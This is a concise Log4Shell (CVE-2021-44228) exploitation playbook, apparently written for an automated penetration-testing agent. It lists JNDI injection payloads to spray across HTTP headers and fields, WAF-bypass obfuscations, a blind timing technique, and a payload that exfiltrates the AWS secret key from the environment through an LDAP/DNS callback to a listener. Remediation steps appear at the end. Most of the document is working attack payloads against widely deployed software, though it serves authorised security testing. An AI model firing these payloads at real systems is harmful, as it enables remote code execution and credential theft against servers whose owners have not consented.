# Log4Shell — CVE-2021-44228 (JNDI)

Any user input that Log4j2 (2.0–2.14.1) logs and that contains
`${jndi:ldap://...}` triggers an outbound JNDI lookup → RCE. The input is often
logged far from where you injected it, so spray broadly.

1. **Inject into every sink** — especially HEADERS, via `http_request`/`http_fuzz`.
   Put an OOB host you control (interactsh / collaborator / DNS logger) in the
   payload so the callback proves the hit: `${jndi:ldap://<oob>/a}`,
   `${jndi:dns://<oob>/a}`.
2. **Targets** (one `http_fuzz` with the marker in each header in turn, or one
   `http_request` per header): `User-Agent`, `X-Forwarded-For`, `X-Api-Version`,
   `Referer`, `X-Forwarded-Host`, `Authorization`, `Cookie`, plus username fields,
   search params, and JSON bodies. Use a unique token per sink
   (`${jndi:ldap://<token>.<oob>/a}`) so the DNS/HTTP callback tells you WHICH
   input is vulnerable.
3. **Confirm**: a DNS/LDAP hit on your OOB listener = vulnerable. WAF-bypass
   variants: `${${lower:j}ndi:...}`, `${${::-j}${::-n}di:...}`,
   `${jndi:${lower:l}${lower:d}ap://...}`.
4. **Exfil without OOB infra**: `${jndi:ldap://x/${env:AWS_SECRET_ACCESS_KEY}}` —
   the secret appears in your listener's hostname query.
5. **No OOB infra? In-band timing fallback (partial).** Point the lookup at a
   non-routable/blackhole address instead of a listener you control —
   `${jndi:ldap://240.0.0.1:1389/x}` or an unreachable internal IP
   (`10.255.255.1`) — the JVM's connect attempt hangs for several seconds.
   Sweep candidate sinks with ONE `http_fuzz` (marker per header/field) and
   read `timeMs` (or `elapsedMs` on a single `http_request`): a multi-second
   delta vs. a harmless baseline in the same field means the JNDI lookup fired.
   This is a LEAD only (no data, no confirmed RCE) — report it as UNCONFIRMED
   per the workflow PROOF rule unless you also get a real OOB callback or a
   follow-on RCE proof.

Evidence: the request header/field + the inbound OOB (DNS/LDAP) callback (or the
exfiltrated value in the callback hostname).
Remediation: upgrade Log4j2 ≥2.17.1; remove the `JndiLookup` class; set
`log4j2.formatMsgNoLookups=true`; block egress from the app server.
